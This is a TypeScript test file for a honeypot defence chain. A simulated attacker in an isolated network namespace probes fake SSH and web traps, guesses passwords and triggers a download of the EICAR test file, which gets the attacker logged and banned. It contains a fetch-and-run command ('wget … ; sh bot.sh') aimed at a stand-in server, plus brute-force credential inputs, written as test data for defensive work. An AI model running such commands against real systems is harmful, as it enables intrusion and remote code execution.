// Loki, Garmr et Ullr ensemble contre un VRAI attaquant (dans un réseau isolé, avec de vrais
// clients : ssh, curl) : il sonde un faux site, se connecte à un faux terminal, essaie des mots de
// passe, fait télécharger un « virus » d'essai (EICAR, le fichier standard pour tester un
// antivirus). Loki note tout, Ullr reconnaît le fichier, Garmr bannit : ses paquets sont coupés.

import { createServer as createHttp } from 'node:http';
import { createServer } from 'node:net';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { garmr } from '../../../src/valhalla/modules/garmr.ts';
import { loki } from '../../../src/valhalla/modules/loki.ts';
import { ullr } from '../../../src/valhalla/modules/ullr.ts';
import { freePort, sh, until, type Scenario } from '../lib.ts';

const NS = 'odinbanc-pir', HOST_IP = '203.0.113.1', ATT_IP = '203.0.113.9';
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

export const pieges: Scenario = {
  id: 'pieges', title: 'Loki → Ullr → Garmr (chaîne de défense)', mode: 'réel',
  what: 'Un attaquant simulé avec de vrais clients (ssh, curl) contre les pièges : tout est noté, le « virus » d\'essai EICAR est reconnu, l\'attaquant est banni par le pare-feu.',
  async run(t) {
    t.needRoot(); await t.need('nft', 'ip', 'curl');
    await sh('ip', ['netns', 'del', NS]);
    if ((await sh('ip', ['netns', 'add', NS])).code) t.skip('impossible de créer un réseau isolé (netns)');
    t.onEnd(async () => { await sh('ip', ['link', 'del', 'op-h']); await sh('ip', ['netns', 'del', NS]); });
    const hadTable = (await sh('nft', ['list', 'table', 'inet', 'odin'])).code === 0;
    t.onEnd(async () => { await sh('nft', ['delete', 'element', 'inet', 'odin', 'garmr4', `{ ${ATT_IP} }`]); if (!hadTable) await sh('nft', ['delete', 'table', 'inet', 'odin']); });
    for (const c of [['link', 'add', 'op-h', 'type', 'veth', 'peer', 'name', 'op-a'], ['link', 'set', 'op-a', 'netns', NS], ['addr', 'add', `${HOST_IP}/24`, 'dev', 'op-h'], ['link', 'set', 'op-h', 'up'], ['-n', NS, 'addr', 'add', `${ATT_IP}/24`, 'dev', 'op-a'], ['-n', NS, 'link', 'set', 'op-a', 'up'], ['-n', NS, 'link', 'set', 'lo', 'up']]) { const r = await sh('ip', c); if (r.code) t.skip(`réseau isolé impossible : ${r.err.trim()}`); }
    const att = (cmd: string, args: string[], input?: string) => sh('ip', ['netns', 'exec', NS, cmd, ...args], { timeoutMs: 12_000, input });

    // Le vrai service à protéger, et le « serveur du pirate » qui héberge son fichier (EICAR).
    const real = createServer((s) => s.end('service réel\n')); await new Promise<void>((r) => real.listen(0, HOST_IP, r)); t.onEnd(() => real.close());
    const realPort = (real.address() as { port: number }).port;
    const reach = async () => (await att(process.execPath, ['-e', `const s=require('net').connect(${realPort},'${HOST_IP}');s.setTimeout(1500,()=>{console.log('BLOQUE');process.exit(0)});s.on('data',()=>{console.log('ENTRE');process.exit(0)});s.on('error',()=>{console.log('BLOQUE');process.exit(0)})`])).out.trim();
    const evil = createHttp((_q, r) => { r.writeHead(200, { 'content-type': 'application/octet-stream' }); r.end(EICAR); }); await new Promise<void>((r) => evil.listen(0, HOST_IP, r)); t.onEnd(() => evil.close());
    const evilUrl = `http://${HOST_IP}:${(evil.address() as { port: number }).port}/bot.sh`;

    const { v, alerts, events } = t.valhalla([loki, garmr, ullr]);
    t.onEnd(() => loki.stop?.());
    v.ctx('garmr').saveSettings({ useJournal: false, useSystemLogs: false });
    await garmr.start!(v.ctx('garmr'));
    // D'abord en observation seule (sans bannir), pour voir tout ce que fait l'attaquant.
    v.ctx('loki').saveSettings({ ban: false });
    const ports = { sshid: await freePort(), skoll: await freePort(), narfi: await freePort(), jormungandr: await freePort() };
    t.ok((await v.act('loki', 'allumer', { piege: 'skoll', port: ports.skoll }, { auto: true })).ok === false, 'ouvrir un piège sur le réseau demande ton accord');
    for (const [piege, port] of Object.entries(ports)) await v.act('loki', 'allumer', { piege, port });
    const journal = join(v.ctx('loki').dir, 'attaques.jsonl'), hits = () => (existsSync(journal) ? readFileSync(journal, 'utf8') : '');
    t.eq(await reach(), 'ENTRE', 'avant : l\'attaquant atteint le vrai service');

    // 1. Un vrai client SSH se présente au faux serveur SSH.
    await att('ssh', ['-p', String(ports.sshid), '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=4', `root@${HOST_IP}`, 'true']);
    t.ok(await until(() => /Narfi-SSH.*client : SSH-2\.0-OpenSSH/.test(hits().replace(/\n/g, ' ')), 5000), 'faux SSH : le vrai client OpenSSH de l\'attaquant est identifié (version notée)', hits().slice(-300));
    // 2. Il sonde le faux site (fichier .env, page d'administration) avec curl.
    const envFile = await att('curl', ['-s', '-m', '5', '-A', 'Mozilla/5.0 zgrab/0.x', `http://${HOST_IP}:${ports.skoll}/.env`]);
    t.ok(/DB_PASSWORD=/.test(envFile.out) && await until(() => /GET \/\.env HTTP\/1\.1 · Mozilla\/5\.0 zgrab/.test(hits()), 4000), 'faux site : il « vole » un faux fichier de mots de passe ; la requête et son outil sont notés', envFile.out.slice(0, 80));
    // 3. Faux terminal : identifiants, commandes, téléchargement d'un « virus ».
    await att(process.execPath, ['-e', `const s=require('net').connect(${ports.narfi},'${HOST_IP}');const say=[['login:','root'],['Password:','123456'],['#','uname -a'],['#','cd /tmp; wget ${evilUrl}; sh bot.sh'],['#','exit']];let buf='';s.on('data',(d)=>{buf+=d;while(say.length&&buf.includes(say[0][0])){buf=buf.slice(buf.indexOf(say[0][0])+say[0][0].length);s.write(say.shift()[1]+'\\r\\n')}});s.on('close',()=>process.exit(0));setTimeout(()=>process.exit(0),6000)`]);
    t.ok(await until(() => /"kind":"identifiants","detail":"root \/ 123456"/.test(hits()), 4000), 'faux terminal : identifiant et mot de passe essayés sont notés (root / 123456)');
    t.ok(/"kind":"commande","detail":"uname -a"/.test(hits()) && /wget http/.test(hits()), 'ses commandes sont notées');
    t.ok(await until(() => alerts.some((a) => /Loki a capturé un fichier/.test(a.title)), 8000), 'le fichier qu\'il fait télécharger est capturé (jamais exécuté) → alerte haute');
    const cap = alerts.find((a) => /Loki a capturé/.test(a.title));
    t.match(cap?.detail ?? '', /Ullr : ⚠ Test antivirus EICAR/, 'Ullr reconnaît le fichier d\'essai standard des antivirus (EICAR) : le verdict est dans l\'alerte');
    t.ok(existsSync(String((cap?.data as { fichier?: string } | undefined)?.fichier)), 'la capture est gardée à l\'écart pour analyse');
    t.eq(await reach(), 'ENTRE', 'en observation seule, l\'attaquant n\'est pas banni');

    // 4. Défense active : au premier mot de passe essayé, Loki demande à Garmr de bannir.
    v.ctx('loki').saveSettings({ ban: true });
    await att('curl', ['-s', '-m', '5', '-d', 'log=admin&pwd=azerty123', `http://${HOST_IP}:${ports.skoll}/wp-login.php`]);
    t.ok(await until(() => /"detail":"admin \/ azerty123"/.test(hits()), 4000), 'faux site : mot de passe essayé noté (admin / azerty123)');
    t.ok(await until(() => events.some((e) => e.module === 'garmr' && e.type === 'banni' && e.data.ip === ATT_IP && e.data.source === 'Loki'), 5000), 'Loki → Garmr : l\'attaquant est banni (24 h)', JSON.stringify(events.filter((e) => e.module === 'garmr')));
    t.match((await sh('nft', ['list', 'set', 'inet', 'odin', 'garmr4'])).out, new RegExp(`${ATT_IP.replace(/\./g, '\\.')} timeout 1d`), 'son adresse est dans le pare-feu pour un jour');
    t.eq(await reach(), 'BLOQUE', 'après : il ne peut plus atteindre le vrai service (paquets coupés par le noyau)');
    const stats = await v.act('loki', 'statistiques');
    t.ok(stats.ok && /123456|azerty123/.test(stats.text), 'statistiques : les mots de passe essayés sont comptés', stats.text.slice(0, 300));
    const view = await loki.view(v.ctx('loki'), new URLSearchParams());
    t.ok(/4 piège\(s\) allumé\(s\)/.test(view.subtitle ?? '') && view.kpis?.some((k) => k.label === 'Captures' && Number(k.value) >= 1), 'la console de Loki montre les pièges allumés et la capture', `${view.subtitle} ${JSON.stringify(view.kpis)}`);
  },
};
